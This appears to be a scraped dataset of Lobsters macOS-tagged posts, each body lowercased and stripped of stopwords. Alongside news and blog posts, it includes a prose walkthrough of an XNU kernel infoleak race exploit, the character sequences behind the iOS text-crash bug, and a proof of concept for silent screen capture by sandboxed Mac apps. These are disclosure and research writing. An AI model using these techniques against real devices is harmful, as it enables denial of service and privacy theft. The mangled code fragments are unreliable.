display oddly enough two connected screen according xrandr screen minimum x current x maximum x edp connected primary normal left inverted right x axis axis x disconnected normal left inverted right x axis axis disconnected normal left inverted right x axis axis connected normal left inverted right x axis axis x connected normal left inverted right x axis axis discovered third display always needed disabled using xrandr output sure issue amdgpu driver apple hardware third output enabled occasionally get artifact window monitor would occupy lower resolution bounding box available display area two displayport device active one display suspect display port screen somehow overlapped onto display port weird buggy driver voodoo still solve problem display port turning back waking sleep state enabled x start eventually saw following kernel log drm amdgpuatombiosdplinktrain amdgpu error channel eq failed try drm amdgpuatombiosdplinktrain amdgpu error channel eq failed message led forum post user suggested video adapter difficulty making signal connection maximumpreferred refresh rate user suggested either lowering raising resolution refresh rate try reenable monitor seemed consistent monitor turning debugging random mode switch switching back fourth virtual console eventually created following script reliably enable external monitor binsh xrandr output mode xrandr output mode even though dropping increase resolution use tiling window manager keeping window position proportion even mode switch power one daunting challenge involved powerbattery ran acpi get battery information battery sensor appearing proc either disconnected usbc power connector x running laptop immediately abruptly shutdown started mac battery would boot get past grub screen begin load gentoo cut tried go graphical mode starting x find anyone else seemed issue suspected problem amdgpu driver attempted follow guide blacklist amd graphic force use intel integrated graphic left nonfunctional x server disabling xdm booting machine encountered cutoff problem power unplugged realized nothing x amd graphic driver problem cloned image previous install tlp service running tlp power management tool linux laptop suspect tlp misinterpreted missing battery status laptop running low power immediately forced shutdown disabling tlp service fixed issue conclusion writing wifi still work adapter show access frequency connect access point close range rendering effectively useless usbc ethernet adapter attached back monitor work perfectly though suspendresume work either week solved tlppower issue macbook pro running linux effectively overpriced desktop shitty driver take meeting even running offline immediate supervisor misgiving running linux dual boot mode would prefer simply run linux vmware fusion virtual machine realize good hypervisor reduce performance hit however still limited accessing full resource hardware still deal managing two conflicting set keybindings furthermore running linux part testing community could help contribute better hardware support previous trial getting hardware working msi laptop involved testing firmware helping others similar wifi adapter several laptop overall getting linux running macbook pro took one full sunday much time waiting kernel recompile rebooting testing although frustrating time something enjoyable challenge figuring piece making work even though driver work certain sanctification assembling effort developer working system like building ikea bookshelf help developer appreciate work go hardware driver well increase full understanding underlying technology use purchase wifi dongle believe macbook pro fully suitable role developer using operating system love work
331,Lobsters,mac,Apple macOS,CVE-2017-13868: A fun XNU infoleak,https://bazad.github.io/2018/03/a-fun-xnu-infoleak/,fun xnu infoleak,finding vulnerability analyzing exploitability alternative approach work final exploit github fix macos io kerncontrolc,way back october discovered kernel information leak xnu quite fun analyze exploit browsing xnu source code noticed function ctlctloutput check return value call sooptcopyin immediately caught attention error checking kernel important poor error checking frequent source security bug case failing check return value opened race window could allow privileged process read arbitrary amount uninitialized kernel heap data finding vulnerability one effective way finding vulnerability simply reading source code area kernel seem relevant security found bug source code auditing reverse engineering technique including fuzzing favorite stumbling onto security flaw accident happens surprisingly often started looking io bug around mid september last year around time noticed seemed uptick number race condition reported apple security note macos io figured would good keep parallelism mind auditing decided look indirect call copyout see could discover obvious information leak information leak category vulnerability kernel discloses information example disclosing kernel pointer userspace may allow local attacker defeat kernel address space randomization kaslr exploit mitigation exploit technique like rop depend knowing location kernel executable code memory mean kernel pointer disclosure become key component modern macos io kernel exploitation copyout function responsible copying data kernel address space address space usermode process kernel infoleaks pas leaked data copyout make call site function promising area look bug however one function many wrapper around copyout also worth investigating example one wrapper sooptcopyout used copy socket option data getsockopt system call looking call function following code ctlctloutput function file bsdkernkerncontrolc caught eye sopt soptvalsize sopt soptval malloc data void sopt soptvalsize mtemp data allocated mwaitok without mzero data null return enomem copy user data case kernel control need error sooptcopyin sopt data b sooptcopyin sopt soptvalsize sopt soptvalsize called fill buffer return len sopt soptvalsize value ignored socketunlock error kctl getopt kctl kctlref kcb unit c getsockopt kcb userdata sopt soptname implementation data len called process data null len sopt soptvalsize buffer panicplain ctlctloutput ctl returned len lu soptvalsize lu n kcb kctl name len sopt soptvalsize socketlock error data null error sooptcopyout sopt data len c succeeded else data buffer sopt soptvalsize len copied userspace ctlctloutput function responsible handling getsockopt system call kernel control socket socket created domain pfsystem protocol sysprotocontrol code following allocates kernel heap buffer data parameter getsockopt mzero flag specified allocation zeroed copy getsockopt data userspace using sooptcopyin filling data buffer allocated copyin completely overwrite allocated data mzero flag needed return value checked call kctl getopt real getsockopt implementation kernel control socket implementation process input buffer possibly modifying shortening return result code finally real getsockopt implementation return error ctlctloutput call sooptcopyout copy data buffer back user space issue return value sooptcopyin checked begs question could happen sooptcopyin fails possible return value checked analyzing exploitability function sooptcopyin responsible copying getsockopt option data userspace allocated buffer sooptcopyin fails perhaps socket option data address invalid kernel data buffer contained option data uninitialized data buffer allocated without mzero flag mean contain uninitialized kernel heap data possibly rife useful kernel pointer lack error checking mean data buffer passed kctl getopt could actually contain uninitialized kernel heap data even though code written seems expect content data buffer always initialized call kctl getopt way get uninitialized memory flow call copyout obvious candidate copyout call sooptcopyout kctl getopt problem sooptcopyout passed sopt structure supplied sooptcopyin mean try write uninitialized data address sooptcopyin tried read socket option earlier order force sooptcopyin fail supplied invalid address make sooptcopyout succeed sooptcopyin failed point remembered consider parallelism would possible make memory address valid call sooptcopyin sooptcopyout need call getsockopt unmapped address getsockopt running kernel call machvmallocate another thread map address way address would unmapped sooptcopyin called causing fail mapped sooptcopyout called allowing copyout uninitialized kernel heap data succeed however one thing need check uninitialized heap data actually make way call sooptcopyout intervening call kctl getopt could overwrite uninitialized data change length data copy userspace actual implementation kctl getopt determined type control socket operating thus order reach sooptcopyout uninitialized data intact need find kernel control socket getopt implementation overwrite whole data buffer shorten data buffer return success fortunately take much searching find candidate function necpctlgetopt getopt implementation necp kernel control socket simply return without processing data buffer primary limitation approach ability reallocate memory address call sooptcopyin sooptcopyout lot work happens call meaning race window could pretty tight race window tight might take large number try actually win race alternative approach work reviewing bug later seemed like possible trigger without race marking memory writeonly way sooptcopyin would fail efault memory readable sooptcopyout would succeed however testing simpler exploit strategy work getsockopt would fail efault sure happened final exploit figuring strategy trigger information leak implemented exploit highlevel strategy open necp kernel control socket launch thread repeatedly map unmap target memory address repeatedly call getsockopt control socket try trigger leak complete exploit available github amazingly turned pretty easy race win performed test macbook pro iphone found median number attempt win race platform respectively distribution rather uneven mean number attempt macbook sometimes rising high however primarily due large outlier would take ten thousand attempt win race great infoleak depend fixed leak size use leak data arbitrary kernel heap zone specifying different size getsockopt make useful exploit primitive performing complex attack kernel fix reported issue apple october assigned apple fixed bug macos io looking new kerncontrolc apple decided fix bug wrapping code call sooptcopyin statement check whether error believe correct fix issue
332,Lobsters,mac,Apple macOS,Mac OS versus FreeBSD: A Comparative Evaluation,https://doi.org/10.1109/MC.2018.1451648,mac o versus freebsd comparative evaluation,forgot password,ieee continue sending helpful information product service please consent updated privacy policy accept sign forgot password
333,Lobsters,mac,Apple macOS,Vulkan Applications Enabled on Apple Platforms,https://www.khronos.org/news/press/vulkan-applications-enabled-on-apple-platforms,vulkan application enabled apple platform,february beaverton khronos group vulkan portability resource page achieve significantly higher performance pierreloup griffais valve moltenvk spirvcross bill hollings president brenwill workshop lunarxchange neil trevett vp nvidia khronos group president vulkan portability feedback issue khronos group khronos group,valve lunarg brenwill workshop join force khronos release open source sdks runtime library khronos portability initiative defines subset vulkan portable macos io february beaverton group open consortium leading hardware software company creating advanced acceleration standard announces working group portability initiative working khronos member valve lunarg brenwill workshop enable vulkan application ported apple platform vulkan portability resource page link collection free open source set tool sdks runtime library enable vulkan development macos deployment macos io platform valve extending dota using vulkan tool macos achieve significantly higher performance native driver vulkan support dota macos released coming month free update running substantial production load vulkan tool mac including dota running faster native opengl version said pierreloup griffais valve effort aimed toward reducing development porting cost developer supporting multiple platform khronos vulkan portability initiative continues refine define universally portable subset vulkan run native performance level metal directx driver released open source today moltenvk library brenwill workshop translates call within vulkan portable subset underlying metal call macos io moltenvk us open source spirvcross crosscompiler translate vulkan shaders underlying native code format moltenvk made freely available developer fee royalty needed ship commercial application moltenvk worked hard bring consistent vulkanbased api macos io maintaining performance improvement required modern game developer said bill hollings president brenwill workshop also available today open source lunarg vulkan sdk macos lunarxchange enables developer build run debug vulkan application apple mac platform lunarg sdk macos provides loader validation layer allows programmer check code correct api usage lunarg continue evolve macos sdk add additional tool feature running vulkan application apple platform number one request developer today release moltenvk runtime lunarg macos sdk brings capability life said neil trevett vp nvidia khronos group president developer invited download open source vulkan portability tool today provide feedback via vulkan portability feedback issue vulkan portability initiative continue strengthen infrastructure tooling around bringing vulkan capability multiple metal platform longterm goal enable portable vulkan code executed platform developer care khronos group khronos group industry consortium creating open standard enable deployment acceleration parallel computing graphic augmented virtual reality vision neural network wide variety platform device khronos standard include e sc khronos member enabled contribute development khronos specification empowered vote various stage public deployment able accelerate delivery cuttingedge accelerated platform application early access specification draft conformance test vulkan registered trademark khronos group khronos openxr devu spir spirv sycl webgl webcl collada openkode openvg openvx egl gltf openkcam streaminput openwf opensl e nnef openmax trademark khronos group inc opencl trademark apple inc opengl registered trademark opengl e opengl sc logo trademark hewlett packard enterprise used license khronos product name trademark andor company name used solely identification belong respective owner
334,Lobsters,mac,Apple macOS,macOS may lose data on APFS-formatted disk images,https://bombich.com/blog/2018/02/15/macos-may-lose-data-on-apfs-formatted-disk-images,macos may lose data apfsformatted disk image,update september update march reported apple sparse disk image likely widespread problem apfs volume free space nt reflect smaller amount free space underlying disk diskimageshelper application nt report error write request fail grow disk image writing data void stop final illusion proactively avoiding data loss today posting update ccc revoke support creating apfsformatted disk image average user recommend ccc user update make brief review backup task macintosh hd macintosh hdsparsebundle na backup sparsebundle sparseimage might recommend deleting destination disk image problem specific ccc,update september issue resolved macos mojave update march issue persists macos week reported apple serious flaw macos lead data loss using apfsformatted disk image apple issue macos update resolve problem dropping support apfsformatted disk image note describe applies apfs sparse disk image ordinary apfs volume eg ssd startup disk affected problem underlying problem serious likely widespread problem applicable small subset backup disk image used backup task activity generally applicable making backup network volume make backup network volume read learn disk image handy device file act like hard drive mount disk image doubleclicking file behaves like another hard drive attached mac macos using disk image decade find particularly useful making backup network volume formatting disk image volume using applenative format thing like back system file naturally apple introduced apfs macos high sierra sought offer support using apfs destination disk image would match format source volume far creating mounting disk image concerned apfs hf easily interchangeable adding support apfs straightforward unnoticed u apple thousand developer however subtle behavioral difference specific apfs sparse disk image earlier week noticed apfsformatted sparsebundle disk image volume showed ample free space despite underlying disk completely full curious copied video file disk image volume see would happen whole file copied without error opened file verified video played back start finish checksummed file far could tell file intact whole disk image unmounted remounted disk image however video corrupted ever lost data know kickinthegut feeling would ensued thankfully running test file disappeared test data taking closer look discovered two bug macos diskimageshelper service lead result apfs volume free space nt reflect smaller amount free space underlying disk past hf formatted disk image disk image volume would automatically adjust free space accommodate difference disk image volume capacity actual amount free space underlying disk example created disk image capacity network volume added stuff network volume outside disk image space stuff disk image accordingly mount disk image would report disk usage free space even literally nothing disk image volume math always felt weird result right disk image ca nt practically accommodate data free space reflect behavior documented apple hdiutil man page prevent error filesystem inside sparse image free space volume holding sparse image hf volume inside sparse image report amount free space slightly le amount free space volume image resides behavior known quantity many many year hf still performs adjustment high sierra appear regression rather oversight specific apfs bug however issue would annoyance larger issue occurs application try write data disk image volume underlying disk accommodate diskimageshelper application nt report error write request fail grow disk image diskimageshelper application work quietly background responding filesystem request made disk image volume essentially broker middleman disk image file disk application nt interact directly file need interact filesystem diskimageshelper application present filesystem interface top disk image file make write request mounted disk image volume request go diskimageshelper application translates request change disk image file initially create sparse disk image file file small eg large enough hold preallocated space filesystem structure copy file disk image volume file grows herein lie bug following earlier example suppose attempt copy data disk image file nt possible free space left underlying disk apfs disk image report free space available though heck let first data successfully get written disk image file disk image file grown underlying disk completely full disk image file longer grow diskimageshelper application getting space left device error trying write data band file point think diskimageshelper application would one following report space left device error process making write request refuse additional write request sorry space unmount disk image stop insanity quit please stop pretending something actually panic kernel writing data void stop ala none thing happen never panic kernel writing void equally unreasonable diskimageshelper continues accept writes application asking write data continues send data eventually completing apparent success final illusion file failed actually make physical disk somewhere think hope perhaps least file would appear smaller disk image probably alarming part bug filesystem structure stored section preallocated space underlying disk diskimageshelper application trouble updating filesystem metadata file size modification date permission etc attribute fine yet another bizarre twist found many time truncated file would even validate checksum test presumably diskimageshelper retains file data ram data never made underlying disk part perhaps hardest explain text created video demonstrate problem proactively avoiding data loss ccc creates us disk image select new disk image destination selector starting ccc ccc ccc automatically create apfsformatted disk image source apfsformatted volume today posting update ccc revoke support creating apfsformatted disk image additionally task currently backing apfsformatted disk image ccc issue warning task completes indicating apfsformatted disk image longer supported ccc prevent using apfsformatted disk image indeed underlying destination overly full need panic nevertheless disk image eventually fill recommendation user migrate away apfsformatted disk image earliest convenience average user average ccc user unaffected apfs shortcoming ccc user completely unaffected user yet high sierra unaffected usage statistic indicate le ccc backup task leverage sparse disk image le apfsformatted recommend ccc user update make brief review backup task open ccc select task read task plan task configured back disk image plainly state eg ccc copy selected item macintosh hd disk image macintosh hdsparsebundle na backup task configured back sparsebundle sparseimage disk image hover mouse source icon tooltip indicate source volume formatted source filesystem apfs destination disk image might formatted apfs well run backup task ccc update disk image usual task completes ccc issue error disk image formatted apfs see warning recommend deleting destination disk image earliest convenience underlying destination full never near capacity eg always free space reason alarmed remove destination disk image weekend night ample time allow ccc recreate hf formatted disk image underlying disk ever filled capacity though delete disk image allow ccc replace hf formatted disk image note disk image end dmg suffix affected problem storage dmg disk image file preallocated file created storage space guaranteed ccc specifically still provide support apfs formatted dmg file problem specific ccc problem affect application writes apfsformatted sparse disk image reside full nearlyfull disk tested scenario copy via terminal application finder copy even exported file quicktime every case application copying creating file completely unaware problem occurred writing data disk quicktime case able immediately open exported file play start finish ejecting remounting disk image quicktime qould nt open file core problem resides macos diskimageshelper application resolved update macos apple resolve disk image bug strongly recommend people avoid using apfsformatted sparse disk image purpose application
335,Lobsters,mac,Apple macOS,Picking Apart the Crashing iOS String,http://manishearth.github.io/blog/2018/02/15/picking-apart-the-crashing-ios-string/,picking apart crashing io string,yet another io text crash sequence bengali indic script consonant cluster investigating bengali case suffixjoining consonant opentype feature hackbunny script zwnj generalizing valid string fakeunicode conclusion interesting theory,yet another io text crash looking particular string crash io basically put string system text box place crash process testing copypasting character spotlight end crashing browser original sequence sequence telugu character consonant ja జ virama consonant nya ఞ zerowidth nonjoiner vowel aa pretty interested made sequence special started investigating first looking thought ja virama nya sequence culprit sequence form special ligature many indic script devanagari often considered letter however ligature telugu seem special also experimentation bug seemed occur pair telugu consonant vowel long vowel ai huh zwnj must something weird consonant virama consonant vowel pretty common sequence indic script zwnj vowel useful script except bengali oriya get saw sequence bengali also crashed sequence consonant স virama consonant ro র zwnj vowel u get let first take little detour learn indic script work indic script consonant cluster indic script abugidas mean letter consonant attach diacritic change vowel default consonant base vowel example क kuh kə often transcribed ka change vowel make ka okay kaa like car usually default vowel ə sound though always bengali sound default vowel need way combine consonant example wished write word ski write स sa ki saki must write happened स got vowel killed got tacked form consonant cluster ligature also write little tail see स known virama basically mean remove vowel explicit viramas sometimes used easy way form ligature eg simple way ligatureify ङ ठ script also prefer explicit viramas eg ski malayalam written little crescent explicit virama unicode virama character always used form consonant cluster written स क sa virama ka font support cluster show ligature otherwise use explicit virama devanagari bengali usually consonant cluster first consonant munged bit second consonant stay intact exception sometimes form entirely new glyph क ष sometimes glyph change ड ड द म द ब last one look like conjunct form investigating bengali case interestingly unlike telugu crash bengali crash seemed occur second consonant র ro however trigger choice first consonant vowel except vowel au র interesting consonant indic script including devanagari devanagari look like र ra however kind thing forming cluster precede another consonant cluster form little featherlike stroke like rka marathi stroke also look like tusk suffix consonant provide little extra leg kra letter without vertical stroke like ठ tha caretlike thing thra basically consonant retain form put inside cluster र special thing र happens even र second consonant cluster mentioned consonant cluster second consonant stay intact exception usually specific cluster र happens cluster similar bengali র second consonant add tentaclelike thing existing consonant example প র po ro give pro র bengali consonant jo well প য po jo form pjo য transformed wavy line called jophola tried য turn bengali crash occurs য well general bengali case consonant virama র য zwnj vowel vowel suffixjoining consonant getting close least bengali occurs second consonant often combine first consonant without modifying form much fact case telugu well consonant cluster telugu usually formed preserving original consonant tacking second consonant example original crashy string contains cluster జ ఞ look like first letter really modified second guess also occur devanagari र indeed क र zwnj ka virama ra zwnj aa one crashing sequence really whole story example crash occur kro zwnj vowel bengali kro ক র ko ro resultant cluster involves munging prefix suffix crash occur seems specific letter nature cluster digging deeper reason many font presumably one use consonant form suffix joining consonant term made preceded virama seems correspond pstf opentype feature well vatu example sequence virama क give ie render virama placeholder followed क र virama र render look like fact case consonant well devanagari viramara bengali viramaro bengali viramajo telugu viramanya telugu viramaka render suffix joining consonant true telugu consonant one listed interesting bit crash occur र virama र zwnj vowel रviramaर us prefixjoining form first र occurs র ৰ য virama stickier left case cause crash ht hackbunny discovering using script enumerate case kannada also suffix joining consonant reason trigger crash ya gurmukhi also suffixjoining zwnj zwnj curious crash happen without mentioned zwnj vowel really anything indic script indic script zwnj used explicitly force virama used virama used write post however used bengali oriya specifically zwnj used force different vowel form used vowel eg v however bug seems apply vowel one form bug also applies script case anyway exception vowel interesting basically vowel made two glyph component philippe verdy point bug occur vowel vowel two part first decomposed two separate glyph reordered buffer glyph vowel need prior mapping keep initial direct mapping codepoints font mean way zwnj look glyph vowel glyph buffer initial codepoints buffer desynchronization probably uninitialized data field lookup made handling zwnj vowel decomposition done data field correctly initialized first consonnant take alternate form virama like indic consonnant cluster glyph buffer created generalizing ultimately full set case cause crash sequence virama zwnj vowel devanagari bengali telugu suffixjoining pstfvatu ie र র য ৰ telugu consonant rephforming letter like रর variant like ৰ vowel two glyph component ie leaf one question open apply kannada matter khmer similar viramalike thing called coeng valid string recurring question getting string valid language unicode gibberish like zalgo text breaking rendered glyph valid original telugu one root word knowledge taken calling bug forbidden knowledge reason telugu devanagari functional use zwnj used vowel one would expect typical text bengali also oriya putting zwnj vowel prevents ligatureifying mentioned unicode spec however seems rare native speaker use script putting zwnj viramas used force explicit virama ligature position zwnj used give hint might mistype also rare least devanagari believe two script well android explicit key zwnj keyboard right next spacebar io well longpress virama key easy mistype least android crashing string usually invalid rare easy enough mistype example fakeunicode string fork foŕk accent easier type slash something normally type produced string gibberish easy enough type accident except course mistake fork foŕk visually obvious would fixed case crashing string conclusion really one guess going love see people think current guess affinity virama left instead right confuses algorithm handle zwnjs viramas thinking zwnj applies virama consonant lead number matching causing buffer overflow something philippe diagnosis vowel situation match interesting thing cause crash happen reliably browser clicking string additionally sometimes actually render spotlight split second crashing mean either crash deterministic occurs process rendering sure think either looking backtraces crash seems occur different place likely memory corruption get uncovered later love hear folk insight update philippe unicode mailing list interesting theory yes could attach debugger crashing process investigate instead fun
336,Lobsters,mac,Apple macOS,Major new iOS bug can crash iPhones and disable access to apps and iMessages,https://www.theverge.com/2018/2/15/17015654/apple-iphone-crash-ios-11-bug-imessage,major new io bug crash iphones disable access apps imessages,shockingly bad week software problem mobile world apple plan fix problem public beta version io least three day ago address io update soon single link could freeze iphone tiny string text disabled imessage video crashed iphones crashed iphones significant io update focusing reliability performance io update et,apple shockingly bad week software problem end look like starting well either new bug discovered io let people send specific character crash iphone block access message app io popular apps like whatsapp facebook messenger outlook io gmail italian blog mobile world spotted bug tested successfully multiple iphones running io found also work macos version safari message apple plan fix problem io update release io spring bug involves sending indian language telugu character device apple io springboard crash message received message longer open app trying failing load character appears way regain access imessages another friend send message try delete thread contained bad character also tested bug thirdparty apps like facebook messenger whatsapp gmail outlook io found apps become disabled message received might difficult fix delete problem message apps like whatsapp unless web access enabled telegram skype appear unaffected public beta version io also unaffected appears apple made aware problem least three day ago plan address io update soon apple history weird io crash bug first time io crashed due weird character url even video last month single link could freeze iphone apple able resolve release io back tiny string text disabled imessage year later video crashed iphones apple also experienced issue io bug december crashed iphones company took unusual step issuing significant io update hour bug started occurring apple face security issue software bug company reportedly focusing reliability performance io new feature report suggest apple taking new approach io update allowing engineer push feature later release instead trying cram big annual update feature reportedly pushed back result allowing apple address security reliability issue discovered io macos recently update et apple plan fix issue update io release spring
337,Lobsters,mac,Apple macOS,The ultimate list of resources to mastering Swift and iOS development — 2018 edition,https://medium.com/@wesharehoodies/the-ultimate-list-of-resources-to-mastering-swift-and-ios-development-2018-edition-3bd2a87ff400,ultimate list resource mastering swift io development edition,,
339,Lobsters,mac,Apple macOS,The Threat to the Mac: the Growing Popularity of Non-Native Apps,https://daringfireball.net/2018/02/non_native_apps_threat_to_mac,threat mac growing popularity nonnative apps,threat mac growing popularity nonnative apps comment hacker news thread report ammon enumerates wrote seven year ago,threat mac growing popularity nonnative apps monday february peter ammon former appkit engineer apple comment hacker news thread regarding report positing ability mac apps even sandboxed one capture screenshots entire screen security problem imo app sandbox grievous strategic mistake mac cocoabased mac apps rapidly eaten web apps electron pseudodesktop apps mac apps survive must capitalize strength superior performance better system integration better dev experience feature higher general quality app sandbox strike return offer security inferior web app post illustrates price far high benefit little imo apple drop mac app sandbox altogether though continue sandbox system service totally sensible maybe retain something geared towards browser code signing requirement dev cert revocation successfully used remotely disable malware sufficient security mac community good sussing bad actor force mac devs castrate apps even anything left protect followup comment ammon enumerates truly native cocoa apps worth creating better use ammon think mac relatively recent move cryptographically signed application certificate revoked apple win around security think mac sandbox sandboxed nature io apps work io designed ground io better platform mac nonexpert user way mac designed sandboxing mind many way sandboxing work keep mac relevant alongside io wrote seven year ago heaviness mac allows io remain light whole point mac great platform native mac apps sandboxing help mac apps mac devolves platform people use web browser crossplatform electron apps might well exist remaining thing would distinguish desktop os icloud integration mac apps able see entire display ever since mac debuted mac need power allow user shoot foot perhaps better said mac need power apps shoot user foot mac need trust software install particularly outside app store mac apps guaranteed safe longer mac restricting sandboxed mac apps would solving problem platform real problem facing mac number developer creating nonnative mac apps number user problem
340,Lobsters,mac,Apple macOS,Mac Privacy: Sandboxed Mac apps can record your screen at any time without you knowing,https://krausefx.com/blog/mac-privacy-sandboxed-mac-apps-can-take-screenshots,mac privacy sandboxed mac apps record screen time without knowing,update fact ocr software worst could happen disclaimer protect user proposal support filed radar work ocr library update similar project worked krausefxcomprivacy,update apple fixed issue macos catalina fact mac app sandboxed sandboxed take screenshots mac silently without knowing access every pixel even mac app background use basic ocr software read text screen access connected monitor worst could happen read password key password manager detect web service use eg email provider read email message open mac developer targeted allows attacker potentially access sensitive source code api key similar data learn personal information user like bank detail salary address etc disclaimer project proof concept used production goal highlight privacy loophole abused mac apps protect user knowledge way protect proposal lot valid usecases mac apps record screen eg support screen recording software even simple screen sharing via web browser skype however must kind control app store review process could verify sandbox entitlement accessing screen put user charge permission dialog additionally user notified whenever app access screen course also filed radar rdar notify apple issue work developer need use cgwindowlistcreateimage generate capture complete screen within instant cgimageref screenshot cgwindowlistcreateimage cgrectinfinite kcgwindowlistoptiononscreenonly kcgnullwindowid kcgwindowimagedefault nsbitmapimagerep bitmaprep nsbitmapimagerep alloc initwithcgimage screenshot experiment piped generated image ocr library able get text rendered user machine update look like apple fixed issue macos catalina similar project worked published post access camera user location data mac screen icloud password check krausefxcomprivacy
341,Lobsters,mac,Apple macOS,My First Open Source Project: Classic Finder,https://bszyman.com/blog/classic-finder,first open source project classic finder,eli schiff long journey file manager cool modern user interface gigantic usage first open source project special thanks barbara do santos michael j fox resource reference,created clonerecreation classic mac o finder modern cocoa objectivec attempted make pixel perfect toscale possible referencing screenshots found around web tangerine ibook running mac o finder clone functional really probably poorly perform finder operation computer file system seems like height criticism regarding flat design infiltrating modern user interface design paging eli schiff realized basically already done flat design well back style used necessity contrast used even topend machine outputting like color good day glistening photorealistic appearance done well mac o x simply beyond technology earlier day efficient utilitarian flat user interface generated graphic apis used output crude collection line square rectangle order denote clickable button widget control onscreen idea would funny see older truer flat design see run natively modern computer operating system mac o yosemite released replaced photorealistic user interface bit piece stark flat user interface bit piece mostly cosmetic overhaul organization flow user interface really change much new ui appearance looked hyper muddy ux sort roughedges oversight operation kind resented sure cleaned attention detail whimsical delightful design mac o used champion scrubbed along reliability yesteryear resentment sort led mode thinking new design juvenile way wanted make mockery modern flat design superimposing original pure flat design top place classic mac o interface realized could easily tediously reconstructed modern mac o even drop lower cocoa drawing apis core graphic draw smaller secondary reason creating sort observe classicera app might run today hardware hardware get beefier seems like software get chunkier could port yesterday software run natively today hardware might perform fast imagine likely much need ghz machine seem like common computing task discussion could maybe another post long journey started project first tested drawing control using canvas worked wonderfully created control got bit interaction going decided could really truly honestly port native create application sort project always sort side project wanted make something true macheads might get nostalgic kind thing one else would care taken two year get project point feel okay showing world onandoff development effort fraught delay due lapse knowledge skill internal conflict architecture decision competing priority outside work delaying project attempt use swift swift newish curious even though somewhat proficiency objectivec wanted learn new thing created initial classic ui control swift playground subclassed nscontrol added subviews got running made lot progress initial round work got dragged away thing time returned project new version swift released caused part earlier work done break tried refactoring code using xcode tool mangled thing made mess revert change source control decided port everything done swift objectivec certainly gripe swift others wanted better objectivec new language project one sporadically working turned year stability objectivec actually allowed ship damn thing without giving existing swift code breaking file manager cool first set create realistic clone old dialog classic mac o got somewhat far point kind stalled yes geeky nostalgic eventually decided put mac hold switch creating clone classic finder insane reason thought would easier project target audience mean people get file manager file system like file manager file system likely lamenting poor support tool newer futuristic platform like io people living future like file system internet tell people use io living future internet tell quit living past internet tell quit damn anachronistic oldcrankyagingluddite internet tell yo btw could possibly better way completely publicly cement resentment general direction modern computing making replica clone file manager done classic mac o chrome modern user interface gigantic learned many thing throughout journey one modern user interface absolutely gigantic compared user interface earlier day mean guess kind way age high dpi monitor bad eye sight wow run classic finder see mean could fit data screen scaled interface bit especially since already decided volunteerly degrade user interface embrace flat design usage classic finder actually work like original finder spatial window behavior lot feature yet implemented currently work sufficient enough stroll memory lane could really use file browser launcher day day however going back feature set original finder feel bit constricting using modern nextderived finder today sidebar toolbars browser metaphor backforward available difficult time trying use classic finder fulltime basis think first open source project making project open source first open source project really know anyone going outside select u appreciate kind thing want malleable maybe something fun people play around would hardly call project finished lot missing functionality edge case filled addressed adding offtime goal still create completely functional recreation classic mac o finder love get pointer commentary seasoned cocoa programmer also best code application architecture work never send code like client ship production environment judge harshly yet licensing project liscense want project stay free open everyone posterity archive collection idea design language sort forgotten time special thanks barbara do santos listening endlessly hope dream invested project michael j fox yes really different mjf encouraging pushing actually get project released resource reference
342,Lobsters,mac,Apple macOS,The mysterious case of (deny dynamic-code-generation),https://alexgaynor.net/2018/jan/29/mysterious-case-of-deny-dynamic-code-generation/,mysterious case deny dynamiccodegeneration,mysterious case deny dynamiccodegeneration comparing chrome edge sandboxing v exploit mitigation approach app sandbox api,mysterious case deny dynamiccodegeneration mon jan day job working sandboxing firefox context browser sandboxing refers process run web page generally called content renderer process contrast parent browser process coordinate content process sandboxed thing like write file anywhere disk save downloaded file access camera related computer security technique exploit mitigation context browser specifically memory corruption exploit mitigation exploit mitigation family approach goal making harder attacker take memory corruption vulnerability heap stack buffer overflow use free type confusion etc turn vulnerability full arbitrary code execution example exploit mitigation aslr stack cooky justin schuh chrome security team excellent blog post comparing chrome edge sandboxing v exploit mitigation approach year ago microsoft added new exploit mitigation called arbitrary code guard acg short acg make mmap mprotect going use posix name throughout post instead mixing window posix name refuse allow new page created protexec existing protexec page marked protwrite unsandboxed process common achieve remote code execution hijacking control flow call system similar function give attacker fresh process choosing however inside browser sandbox attacker create new process instead need run payload inside process address space one technique hijack control flow create new page executable memory place shellcode inside memory hijack control flow jump shellcode acg mitigates technique preventing attacker creating page executable memory shellcode instead forced use technique rop encode payload one recent project firefox investigating whether enabling acg made sense u enabling acg browser complex task javascript jit compiler rely allocating new executable memory page runtime edge browser currently leverage acg however another blog post instead rest post investigation whether possible u mitigation like acg macos folk familiar io security model probably recognize io process acg like mechanism besides safari process allowed allocate new executable page runtime requirement code io signed however clear macos similar mechanism bit digression macos two way sandbox process one use macos app sandbox api official supported documented way sandbox application present browser chrome firefox safari us api instead use private macos seatbelt api seatbelt api really subset scheme provides declarative syntax expressing permission process far favorite sandboxing api worked primarily window linux one downside documentation anytime file bug apple tell use app sandboxing instead oh well given documentation two tactic use figure functionality available disassembling binary provide functionality looking sandbox policy macos ship system binary went see macos anything like acg started grepping around system profile systemlibrarysandboxprofiles eventually stumbled upon deny dynamiccodegeneration profile cuff sounded like looking seemed like sort name might describe io functionality process also discovered filemapexecutable policy rule discus later put together pretty quick proofofconcept test whether work apply sandbox policy mmap memory stick simple assembly function mprotect memory protexec attempt call include asserth include stdioh include stdlibh include stringh include sysmmanh include sandboxh static const char ksandboxpolicy r version deny default deny dynamiccodegeneration void enablesandbox char err int rv sandboxinit ksandboxpolicy err rv fprintf stderr sandboxinit error sn err exit static const kshellcode movq rdi rax addq rax ret typedef function function createfunction const shellcode sizet length void codebuf mmap nullptr length protread protwrite mapprivate mapanonymous assert codebuf nullptr memcpy codebuf kshellcode length int rv mprotect codebuf length protread protexec assert rv return function codebuf int main enablesandbox printf sandbox enabled n function f createfunction kshellcode sizeof kshellcode printf function created n re f printf function called llun re compile run program run without error rather failing mprotect memory protexec crashing would expected spent time seeing various change would give behaviour expected mapping memory protread protwrite protexec instead protread protexec including protexec mmap rather mprotect mmaping multiple page instead single one struck none got needed exploit mitigation protected attacker creating new executable page point decided report apple potential security issue bit fence since know certain intended behaviour dynamiccodegeneration without documentation maybe never expected work macos nonetheless macos sandbox profile using evidence someone expected work macos plus clear reproducer expected behaviour easy enough recognize unfortunately story unhappy ending apple declared poc demonstrate behavior dynamiccodegeneration unexpected still sure expected behaviour perhaps someone better reverseengineering read figure deny dynamiccodegeneration done expected missing piece building acgalike mitigation macos piece exist limiting sort dynamic library loaded window achieved code integrity guard requires dlls loaded signed macos achieve filemapexecutable permission default macos sandbox policy allows loading dynamic library anywhere read file filemapexecutable add denyall rule whitelist particular place disk load library landed patch firefox limit u loading library system directory firefoxapp directory content process write directory meaning load attacker controlled dynamic library 